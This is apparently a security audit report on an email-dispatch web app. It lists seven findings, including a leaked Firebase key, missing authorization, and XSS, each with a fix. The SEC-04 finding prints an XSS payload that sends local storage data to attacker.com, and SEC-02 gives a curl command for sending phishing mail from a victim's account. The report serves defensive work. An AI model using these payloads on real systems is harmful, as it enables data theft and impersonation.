# iEmail Security Audit Report

**Date**: October 2026  
**Auditor**: Antigravity Security Analysis  
**Project**: iEmail (Frontend: Next.js 16 / Backend: NestJS 11)  
**Status**: Review Completed — Action Required on Critical Findings  

---

## 1. Executive Summary

A comprehensive security audit of the iEmail codebase (frontend and backend) was conducted. The assessment covered credential exposure, authentication and authorization mechanisms, API endpoint controls, cross-site scripting (XSS), input validation, session management, and third-party dependencies.

Several critical and high-severity issues were identified, notably:
1. **Committed Firebase Service Account Private Key** on disk in `backend/service.json` (tracked in Git history).
2. **Missing Authorization on Email Dispatch Endpoint** (`POST /send-emails`), allowing anyone who knows a user's email address to send emails from their account.
3. **Unrestricted Account Enumeration** in `GET /auth/accounts`, leaking all connected user identities.
4. **Potential Cross-Site Scripting (XSS)** in the frontend email preview due to unescaped user-supplied spreadsheet values rendered in HTML.

---

## 2. Vulnerability Severity Matrix

| ID | Vulnerability | Component | Severity | Status |
|---|---|---|---|---|
| **SEC-01** | Live Firebase Admin Private Key Tracked in Git | Backend (`service.json`) | **CRITICAL** | `.gitignore` updated; **Key rotation required** |
| **SEC-02** | Unauthenticated Email Dispatch (`POST /send-emails`) | Backend (`mail.controller.ts`) | **CRITICAL** | Needs token verification guard |
| **SEC-03** | User Account Enumeration Without Authentication | Backend (`auth.controller.ts`) | **HIGH** | Needs required `deviceId` guard |
| **SEC-04** | Client-Side XSS in Email Preview | Frontend (`PreviewStep.tsx`) | **HIGH** | Needs HTML sanitization (`DOMPurify`) |
| **SEC-05** | Unauthenticated Template CRUD (`/templates`) | Backend (`templates.controller.ts`) | **MEDIUM** | Needs user ownership verification |
| **SEC-06** | Formula Injection Risk in Spreadsheet Parsing | Frontend (`excel-utils.ts`) | **MEDIUM** | Needs cell prefix sanitization |
| **SEC-07** | High-Severity CVEs in `xlsx` Dependency | Frontend (`package.json`) | **HIGH** | Vulnerable to prototype pollution & ReDoS |

---

## 3. Detailed Vulnerability Analysis

### SEC-01: Live Firebase Admin Private Key Tracked in Git
- **Severity**: **CRITICAL (CVSS 9.8)**
- **File**: `backend/service.json` & `backend/.gitignore`
- **Description**:
  The `service.json` file in the backend root contains a valid, production Google service account certificate with full Firebase Admin privileges (`project_id: iemail-abe84`).
  The `.gitignore` file had `#service.json` commented out, causing the secret key to be tracked in Git.
- **Risk**:
  Anyone with access to the Git repository or its commit history can extract the private key and gain administrative access to the entire Firebase project, including reading all stored OAuth tokens, modifying Firestore documents, and impersonating users.
- **Remediation Steps**:
  1. **Immediately revoke the compromised key** in the [Google Cloud Console Service Accounts](https://console.cloud.google.com/iam-admin/serviceaccounts) for `iemail-abe84`. Generate a new key and update environment variables.
  2. Untrack `service.json` from git index:
     ```bash
     cd backend
     git rm --cached service.json
     git commit -m "security: untrack service.json from git index"
     ```
  3. Ensure `service.json` is listed in `.gitignore` (already applied).
  4. Use environment variables in production:
     `FIREBASE_PROJECT_ID`, `FIREBASE_CLIENT_EMAIL`, and `FIREBASE_PRIVATE_KEY`.
     `FirebaseService` already supports these natively via `initWithEnv()`.

---

### SEC-02: Unauthenticated Email Dispatch (`POST /send-emails`)
- **Severity**: **CRITICAL (CVSS 9.1)**
- **File**: `backend/src/mail/mail.controller.ts` (lines 10–35)
- **Description**:
  The `sendEmails` endpoint accepts `{ sender: "user@example.com", recipients: "...", subject: "...", body: "..." }` and directly queries Firestore for `user@example.com`'s stored OAuth credentials to dispatch outbound emails via the Gmail API.
  There is **zero authentication check** or cryptographic proof that the client making the request owns or is logged in as `user@example.com`.
- **Exploit Scenario**:
  An attacker calls `GET /auth/accounts` (see SEC-03) to obtain victim email addresses, then sends a POST request:
  ```bash
  curl -X POST http://localhost:3001/send-emails \
    -F 'sender=victim@gmail.com' \
    -F 'recipients=[{"email":"target@domain.com"}]' \
    -F 'subject=Phishing Attack' \
    -F 'body=Malicious content'
  ```
  The backend will use the victim's stored Gmail refresh token to send the spam/phishing email.
- **Remediation**:
  Pass the Firebase ID token in the `Authorization: Bearer <idToken>` header from the frontend.
  Verify the token using `admin.auth().verifyIdToken(token)` inside a NestJS `CanActivate` Guard:
  ```typescript
  const decodedToken = await admin.auth().verifyIdToken(idToken);
  if (decodedToken.email !== body.sender) {
    throw new UnauthorizedException('Sender email does not match authenticated user');
  }
  ```

---

### SEC-03: User Account Enumeration Without Authentication
- **Severity**: **HIGH (CVSS 7.5)**
- **File**: `backend/src/auth/auth.controller.ts` (lines 124–157)
- **Description**:
  In `GET /auth/accounts`:
  ```typescript
  if (deviceId) {
    snapshot = await collection.where('deviceIds', 'array-contains', deviceId).get();
  } else {
    snapshot = await collection.orderBy('updated_at', 'desc').get();
  }
  ```
  If `deviceId` is omitted, the API returns **all connected user accounts across the entire application**, exposing email addresses, names, and profile picture URLs.
- **Remediation**:
  Never fall back to dumping all accounts. Require `deviceId` or return an empty array if missing:
  ```typescript
  if (!deviceId) {
    return { accounts: [] };
  }
  ```

---

### SEC-04: Client-Side XSS in Email Preview
- **Severity**: **HIGH (CVSS 7.2)**
- **File**: `frontend/components/PreviewStep.tsx` (line 421)
- **Description**:
  The preview body is rendered using `dangerouslySetInnerHTML`:
  ```tsx
  <div
    className="prose prose-invert max-w-none text-xs text-[#E6EDF3]"
    dangerouslySetInnerHTML={{ __html: previewBody || '...' }}
  />
  ```
  The `previewBody` contains raw interpolated column values from the uploaded spreadsheet without HTML tag or script sanitization.
- **Exploit Scenario**:
  A victim uploads or receives a shared spreadsheet where the `Name` column contains:
  `<img src=x onerror="fetch('https://attacker.com/steal?data='+encodeURIComponent(localStorage.getItem('iEmail_senderEmail')))">`
  When the user steps through the recipient preview, the JavaScript payload executes in their browser context.
- **Remediation**:
  Sanitize the output with `DOMPurify` before rendering:
  ```bash
  npm install isomorphic-dompurify
  ```
  ```tsx
  import DOMPurify from 'isomorphic-dompurify';
  // ...
  <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(previewBody) }} />
  ```

---

### SEC-05: Unauthenticated Template CRUD (`/templates`)
- **Severity**: **MEDIUM (CVSS 6.5)**
- **File**: `backend/src/templates/templates.controller.ts`
- **Description**:
  Endpoints for creating, listing, updating, and deleting templates (`/templates`) rely solely on the `email` field passed in query strings or request bodies without verifying user ownership. Any user can view or overwrite another user's email templates.
- **Remediation**:
  Enforce authentication via Firebase Auth Bearer token on all `/templates` routes and tie template access to `req.user.email`.

---

### SEC-06: Formula Injection / CSV Injection
- **Severity**: **MEDIUM (CVSS 5.3)**
- **File**: `frontend/lib/excel-utils.ts`
- **Description**:
  Spreadsheet cells beginning with characters like `=`, `+`, `-`, or `@` can be treated by desktop spreadsheet tools (Excel, LibreOffice) as formulas rather than raw text.
- **Remediation**:
  Strip or prefix leading formula trigger characters with a single quote (`'`) if the data is exported or re-downloaded.

---

### SEC-07: High-Severity Dependencies (`xlsx`)
- **Severity**: **HIGH (CVSS 7.8)**
- **Component**: `frontend/node_modules/xlsx`
- **Vulnerabilities**:
  - `GHSA-4r6h-8v6p-xvw6`: Prototype Pollution in SheetJS.
  - `GHSA-5pgg-2g8v-p4x9`: Regular Expression Denial of Service (ReDoS).
- **Remediation**:
  Consider replacing `xlsx` with [`exceljs`](https://www.npmjs.com/package/exceljs) or [`xlsx-populate`](https://www.npmjs.com/package/xlsx-populate) for parsing spreadsheet files securely without prototype pollution hazards.

---

## 4. Priority Remediation Checklist

- [ ] **Step 1 (Immediate)**: Revoke the Google service account key in Google Cloud Console.
- [ ] **Step 2 (Immediate)**: Run `git rm --cached backend/service.json` and push commit.
- [ ] **Step 3 (High)**: Add Firebase Auth token validation guard to `POST /send-emails`.
- [ ] **Step 4 (High)**: Prevent full account dumping in `GET /auth/accounts` when `deviceId` is empty.
- [ ] **Step 5 (High)**: Add `DOMPurify.sanitize()` to `PreviewStep.tsx` `dangerouslySetInnerHTML`.
- [ ] **Step 6 (Medium)**: Add user ownership checks to `/templates` and `/history`.
- [ ] **Step 7 (Medium)**: Migrate `xlsx` to a modern spreadsheet parser (`exceljs`).
